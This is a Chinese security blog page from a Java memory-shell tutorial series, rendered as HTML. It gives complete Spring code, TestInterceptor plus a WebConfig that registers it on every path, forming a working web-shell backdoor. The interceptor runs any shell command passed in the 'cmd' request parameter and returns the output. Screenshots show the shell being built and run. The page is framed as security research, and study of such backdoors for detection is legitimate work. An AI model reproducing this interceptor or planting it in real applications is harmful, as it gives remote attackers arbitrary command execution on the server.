@@ -1,0 +1,101 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>编写一个简单的Spring Interceptor | 1ux4ry Archive</title><meta name=description content="Java 内存马 作为一种无文件落地的木马，研究很有必要"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><a href=#完整代码>完整代码</a></li><li><a href=#mvn--打包>mvn 打包</a></li><li><a href=#启动运行-执行命令>启动运行 执行命令</a></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label="编写一个简单的Spring Interceptor"><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./JAVA内存马基础系列</p><div class=article-hero-card__title><span class=article-hero-card__title-main>Java内存马基础系列</span>
+<span class=article-hero-card__title-sub>编写一个简单的Spring Interceptor</span></div><p class=article-hero-card__meta>Java内存马 / Java内存马基础系列 / 1ux4ry Archive</p><p class=article-hero-card__desc>Java 内存马 作为一种无文件落地的木马，研究很有必要</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>Java内存马基础系列</p><h1>编写一个简单的Spring Interceptor</h1><div class=single-meta><span>2026-06-15</span>
+<span>Java内存马</span>
+<span># 安全研究</span></div></header><div class="page-copy content-body"><h1 id=完整代码>完整代码</h1><p>TestInterceptor.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example.interceptor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.handler.HandlerInterceptorAdapter</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.servlet.http.HttpServletRequest</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.servlet.http.HttpServletResponse</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>TestInterceptor</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>HandlerInterceptorAdapter</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>preHandle</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>){</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>PrintWriter</span><span class=w> </span><span class=n>writer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>response</span><span class=p>.</span><span class=na>getWriter</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ProcessBuilder</span><span class=w> </span><span class=n>processBuilder</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=p>(</span><span class=n>System</span><span class=p>.</span><span class=na>getProperty</span><span class=p>(</span><span class=s>&#34;os.name&#34;</span><span class=p>).</span><span class=na>toLowerCase</span><span class=p>().</span><span class=na>contains</span><span class=p>(</span><span class=s>&#34;win&#34;</span><span class=p>)){</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>processBuilder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ProcessBuilder</span><span class=p>(</span><span class=s>&#34;cmd.exe&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;/c&#34;</span><span class=p>,</span><span class=w> </span><span class=n>cmd</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=k>else</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>processBuilder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ProcessBuilder</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;-c&#34;</span><span class=p>,</span><span class=w> </span><span class=n>cmd</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>Scanner</span><span class=w> </span><span class=n>inputScanner</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>Scanner</span><span class=p>(</span><span class=n>processBuilder</span><span class=p>.</span><span class=na>start</span><span class=p>().</span><span class=na>getInputStream</span><span class=p>()).</span><span class=na>useDelimiter</span><span class=p>(</span><span class=s>&#34;\\A&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inputScanner</span><span class=p>.</span><span class=na>hasNext</span><span class=p>()</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>inputScanner</span><span class=p>.</span><span class=na>next</span><span class=p>():</span><span class=w> </span><span class=n>output</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>inputScanner</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>writer</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>output</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>writer</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>writer</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>ignored</span><span class=p>){}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><p>webconfig.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example.config</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.example.interceptor.TestInterceptor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.context.annotation.Configuration</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.config.annotation.InterceptorRegistry</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.config.annotation.WebMvcConfigurer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=nd>@Configuration</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>WebConfig</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>WebMvcConfigurer</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>addInterceptors</span><span class=p>(</span><span class=n>InterceptorRegistry</span><span class=w> </span><span class=n>registry</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>registry</span><span class=p>.</span><span class=na>addInterceptor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>TestInterceptor</span><span class=p>()).</span><span class=na>addPathPatterns</span><span class=p>(</span><span class=s>&#34;/**&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><p>TestController.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example.controller</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.stereotype.Controller</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.RequestMapping</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.ResponseBody</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=nd>@Controller</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>TestController</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@ResponseBody</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=s>&#34;/test&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>test</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=s>&#34;hello spring&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><h1 id=mvn--打包>mvn 打包</h1><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260517165724234.png alt=image.png loading=lazy decoding=async></figure></p><h1 id=启动运行-执行命令>启动运行 执行命令</h1><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260517165857643.png alt=image.png loading=lazy decoding=async></figure></p><p>发现日志没有任何输出回显 但是已经输出命令了</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260517165933851.png alt=image.png loading=lazy decoding=async></figure></p></div><div class=single-tags><a href=/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/># 安全研究</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
